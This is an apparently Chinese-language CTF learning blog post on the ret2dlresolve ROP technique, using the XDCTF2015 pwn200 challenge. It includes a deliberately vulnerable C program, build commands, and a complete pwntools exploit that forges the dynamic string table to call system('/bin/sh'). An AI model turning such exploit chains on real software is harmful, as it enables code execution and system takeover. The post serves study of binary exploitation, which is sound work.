@@ -1,0 +1,212 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ret2dlsolve漏洞的复现 | Daily Study</title><meta name="author" content="C0KE"><meta name="copyright" content="C0KE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ret2dlsolve漏洞的复现前言为了学到更多的关于ROP利用的知识开始复现这个漏洞，也为了能够更加深刻的了解程序动态链接的过程，学习更加底层的知识。 原理在Linux中，程序使用_dl_runtime_resolve(link_map_obj,reloc_offset)来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析函数了呢？答案是肯定的。这也">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ret2dlsolve漏洞的复现">
+<meta property="og:url" content="http://c0ke.top/2025/07/15/ret2dlsolve%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Daily Study">
+<meta property="og:description" content="ret2dlsolve漏洞的复现前言为了学到更多的关于ROP利用的知识开始复现这个漏洞，也为了能够更加深刻的了解程序动态链接的过程，学习更加底层的知识。 原理在Linux中，程序使用_dl_runtime_resolve(link_map_obj,reloc_offset)来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析函数了呢？答案是肯定的。这也">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png">
+<meta property="article:published_time" content="2025-07-15T08:06:26.336Z">
+<meta property="article:modified_time" content="2025-07-30T03:18:41.293Z">
+<meta property="article:author" content="C0KE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png"><link rel="shortcut icon" href="/img/fa.jpg"><link rel="canonical" href="http://c0ke.top/2025/07/15/ret2dlsolve%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%A4%8D%E7%8E%B0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'ret2dlsolve漏洞的复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-07-30 11:18:41'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">404</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Daily Study"><span class="site-name">Daily Study</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ret2dlsolve漏洞的复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-15T08:06:26.336Z" title="发表于 2025-07-15 16:06:26">2025-07-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-30T03:18:41.293Z" title="更新于 2025-07-30 11:18:41">2025-07-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ROP/">ROP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ret2dlsolve漏洞的复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ret2dlsolve漏洞的复现"><a href="#ret2dlsolve漏洞的复现" class="headerlink" title="ret2dlsolve漏洞的复现"></a>ret2dlsolve漏洞的复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>为了学到更多的关于ROP利用的知识开始复现这个漏洞，也为了能够更加深刻的了解程序动态链接的过程，学习更加底层的知识。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在Linux中，程序使用<code>_dl_runtime_resolve(link_map_obj,reloc_offset)</code>来对动态链接的函数进行重定位。那么如果我们可以控制相应的参数及其对应地址的内容是不是就可以控制解析函数了呢？答案是肯定的。这也就是ret2dlresolve攻击的核心所在。</p>
+<p>具体的，动态链接器在解析符号地址时所使用的重定位表项，动态符号表，动态字符串表都是从目标文件中的动态节<code>.dynamic</code>索引得到的。如果我们能够修改其中的某些内容使得动态链接器解析的符号是我们想要解析的符号，那么攻击就达成了。</p>
+<h3 id="思路一-–-直接控制重定位表项的相关内容"><a href="#思路一-–-直接控制重定位表项的相关内容" class="headerlink" title="思路一 – 直接控制重定位表项的相关内容"></a>思路一 – <font color='cornflowerblue'>直接控制重定位表项的相关内容</font></h3><p>由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法<font color='red'>是直接修改动态字符串表<code>.dynstr</code></font>,比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串表。但是动态字符串表和代码映射在一起，是只读的，此外，类似地，我们可以发现动态符号表，重定位表项都是只读的。</p>
+<p>但是，<font color='green'>假如我们可以控制程序流，那我们就可以伪造合适的重定位偏移，从而达到调动目标函数的目的。</font>然而，这种办法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保链接器在解析的过程中不会出错。</p>
+<h3 id="思路二-–-间接控制重定位表项的相关内容"><a href="#思路二-–-间接控制重定位表项的相关内容" class="headerlink" title="思路二 – 间接控制重定位表项的相关内容"></a>思路二 – <font color='yellow'>间接控制重定位表项的相关内容</font></h3><p>既然动态链接器会从<code>.dynamic</code>节中索引到各个目标节，那如果我们可以修改动态节中的内容，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的</p>
+<h3 id="思路三-–-伪造link-map"><a href="#思路三-–-伪造link-map" class="headerlink" title="思路三 – 伪造link_map"></a>思路三 – <font color='red'>伪造link_map</font></h3><p>由于动态链接器在解析符号地址时，主要依赖于link_,map来查询相关的地址。因此，如果我们可以成功伪造link_map，也就可以控制程序执行目标函数。</p>
+<h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><p>首先，我们可以按照下面的方式来编译对应文件</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><font color='green'>编译</font></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">❯ gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32</span><br><span class="line">❯ checksec main_no_relro_32</span><br><span class="line">[*] &#x27;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/no-relro/main_no_relro_32&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>在这种情况下，修改<code>.dynamic</code>会简单些。因为我们只需要修改<code>.dynamic</code>节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下：</p>
+<ul>
+<li>修改<code>.dynamic</code>节中字符串表的地址为伪造的地址</li>
+<li>在伪造的地址处构造好字符串表，将read字符串替换为system字符串。</li>
+<li>在特定的位置读取&#x2F;bin&#x2F;sh字符串。</li>
+<li>调用read函数的plt的第二条指令，触发<code>_dl_runtimr_resolve</code>进行函数解析，从而执行<code>system</code>函数</li>
+</ul>
+<p><font color='red'>exp代码如下</font></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x08049804</span>+<span class="number">4</span>,<span class="number">4</span>) <span class="comment"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>,<span class="built_in">len</span>((dynstr))) <span class="comment"># construct a fake dynstr section</span></span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>+<span class="number">0x100</span>,<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># read /bin/sh\x00</span></span><br><span class="line">rop.raw(<span class="number">0x08048376</span>) <span class="comment"># the second instruction of read@plt </span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(<span class="number">0x080498E0</span>+<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(p32(<span class="number">0x080498E0</span>))</span><br><span class="line">p.send(dynstr)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial  RELRO"></a>Partial  RELRO</h3><p>首先我们可以编译源文件main.c得到二进制文件，这里取消了Canary保护。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">❯ gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie ../../main.c -o main_partial_relro_32</span><br><span class="line">❯ checksec main_partial_relro_32</span><br><span class="line">[*] &#x27;/mnt/hgfs/ctf-challenges/pwn/stackoverflow/ret2dlresolve/2015-xdctf-pwn200/32/parti</span><br><span class="line">al-relro/main_partial_relro_32&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>在这种情况下，ELF文件中的 <code>.dynamic</code>节将会变成只读的，这时我们可以通过伪造重定位表项的方式来调用目标函数。</p>
+<p>在下面的讲解过程中，本文会按照以下两种不同的方式来使用该技巧。</p>
+<ul>
+<li>通过手工伪造的方式使用该技巧，从而获取shell。这种方式虽然比较麻烦，但是可以仔细理解ret2slreslove的原理。</li>
+<li>利用工具来实现攻击，从而获取shell。这种方式比较简单，但我们还是应该充分理解背后的原理，不能只是会使用工具。</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://c0ke.top">C0KE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://c0ke.top/2025/07/15/ret2dlsolve%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%A4%8D%E7%8E%B0/">http://c0ke.top/2025/07/15/ret2dlsolve%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://c0ke.top" target="_blank">Daily Study</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/07/15/RE%E2%80%94%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94%E6%B5%81%E6%B5%AA%E8%80%85/" title="RE—攻防世界—流浪者"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">RE—攻防世界—流浪者</div></div></a></div><div class="next-post pull-right"><a href="/2025/07/15/ret2csu%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/" title="ret2csu原理与利用"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ret2csu原理与利用</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C0KE</div><div class="author-info__description">C0KE's Study Diary</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">404</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/C0KE"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/C0KE" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/weixin_62675330?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2269279877@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">人人都有选择如何活着的权力</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ret2dlsolve%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">ret2dlsolve漏洞的复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%80-%E2%80%93-%E7%9B%B4%E6%8E%A5%E6%8E%A7%E5%88%B6%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E9%A1%B9%E7%9A%84%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9"><span class="toc-number">1.2.1.</span> <span class="toc-text">思路一 – 直接控制重定位表项的相关内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%BA%8C-%E2%80%93-%E9%97%B4%E6%8E%A5%E6%8E%A7%E5%88%B6%E9%87%8D%E5%AE%9A%E4%BD%8D%E8%A1%A8%E9%A1%B9%E7%9A%84%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9"><span class="toc-number">1.2.2.</span> <span class="toc-text">思路二 – 间接控制重定位表项的相关内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF%E4%B8%89-%E2%80%93-%E4%BC%AA%E9%80%A0link-map"><span class="toc-number">1.2.3.</span> <span class="toc-text">思路三 – 伪造link_map</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">1.3.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NO-RELRO"><span class="toc-number">1.3.1.</span> <span class="toc-text">NO RELRO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Partial-RELRO"><span class="toc-number">1.3.2.</span> <span class="toc-text">Partial  RELRO</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/Tenda-FH1201%E5%A4%9A%E5%A4%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0/" title="Tenda-FH1201多处命令注入漏洞分析和复现"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tenda-FH1201多处命令注入漏洞分析和复现"/></a><div class="content"><a class="title" href="/2025/07/30/Tenda-FH1201%E5%A4%9A%E5%A4%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0/" title="Tenda-FH1201多处命令注入漏洞分析和复现">Tenda-FH1201多处命令注入漏洞分析和复现</a><time datetime="2025-07-30T03:04:06.916Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/GL-iNet%20%E8%B7%AF%E7%94%B1%E5%99%A8%20CVE-2024-39226%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="GL-iNet 路由器 CVE-2024-39226 漏洞分析"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GL-iNet 路由器 CVE-2024-39226 